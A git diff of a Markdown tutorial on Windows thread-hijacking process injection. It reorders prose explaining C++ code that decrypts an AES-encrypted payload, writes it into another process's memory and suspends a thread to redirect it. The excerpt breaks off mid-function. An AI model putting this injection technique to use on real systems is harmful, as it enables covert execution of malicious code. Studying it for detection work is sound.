@@ -140,20 +140,18 @@ HANDLE FindThread(int pid){
 #### Thread Hijacking
 Note that this function begins by declaring a null handle (`hThread`) to the target thread, a null LPVOID-type pointer (`pRemoteCode`) which will eventually point to the injected payload, and a [CONTEXT](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)-type variable (`ctx`), which is actually a structure containing the thread context that will be manipulated to perform the hijacking technique.
 
-After calling the custom `FindThread()` function to return a handle to the target thread within the target process, payload decryption takes place via the custom [AESDecrypt](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption) function shown in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption).
-
-Similar to classic process injection, memory is allocated within the target process using [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), and the payload is written to this memory via [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
-
-Then, the manipulation of thread context to achieve hijacking takes place. The thread is suspended using [`SuspendThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread), which takes the handle to the target thread (`hThread`) returned by the custom `InjectCTX` function, as an argument. The `ContextFlags` element of the [CONTEXT](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) structure (`ctx`) is defined by the value `CONTEXT_FULL`, indicating that the full context object should be obtained by the proceeding call to [GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext). Afterwards, redirection takes place when an architecture-appropriate instruction pointer (`Eip` / `Rip`) is designated as the pointer to the payload previously written into allocated memory. This change in the instruction pointer (`Eip` / `Rip`) is formalized by calling [`SetThreadContext()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext), which takes the handle to the targeted thread (`hThread`) and the location of the [thread context structure](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) (`&ctx`). Finally, the handle to the redirected thread (`hThread`) is passed to the [`ResumeThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) function, which resumes the thread and therefore executes the corresponding payload stored in the process.
-
 ```c++
 int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
 	HANDLE hThread = NULL;
 	LPVOID pRemoteCode = NULL;
 	CONTEXT ctx;
+```
 
-	// call FindThread() to locate a thread in target process
+After calling the custom `FindThread()` function to return a handle to the target thread within the target process, payload decryption takes place via the custom [AESDecrypt](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption) function shown in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption).
+
+```c++
+// call FindThread() to locate a thread in target process
 	hThread = FindThread(pid);
 	if (hThread == NULL) {
 		printf("Error, hijack unsuccessful.\n");
@@ -162,13 +160,21 @@ int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int paylo
 
 	// decrypt payload
 	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
-	
-	// memory allocation
+```
+
+Similar to classic process injection, memory is allocated within the target process using [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), and the payload is written to this memory via [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
+
+```c++
+// memory allocation
 	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
   
         // write payload to allocated memory
 	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+```
 
+Then, the manipulation of thread context to achieve hijacking takes place. The thread is suspended using [`SuspendThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread), which takes the handle to the target thread (`hThread`) returned by the custom `InjectCTX` function, as an argument. The `ContextFlags` element of the [CONTEXT](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) structure (`ctx`) is defined by the value `CONTEXT_FULL`, indicating that the full context object should be obtained by the proceeding call to [GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext). Afterwards, redirection takes place when an architecture-appropriate instruction pointer (`Eip` / `Rip`) is designated as the pointer to the payload previously written into allocated memory. This change in the instruction pointer (`Eip` / `Rip`) is formalized by calling [`SetThreadContext()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext), which takes the handle to the targeted thread (`hThread`) and the location of the [thread context structure](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) (`&ctx`). Finally, the handle to the redirected thread (`hThread`) is passed to the [`ResumeThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) function, which resumes the thread and therefore executes the corresponding payload stored in the process.
+
+```c++
 	// suspend thread
 	SuspendThread(hThread);	
 	ctx.ContextFlags = CONTEXT_FULL;
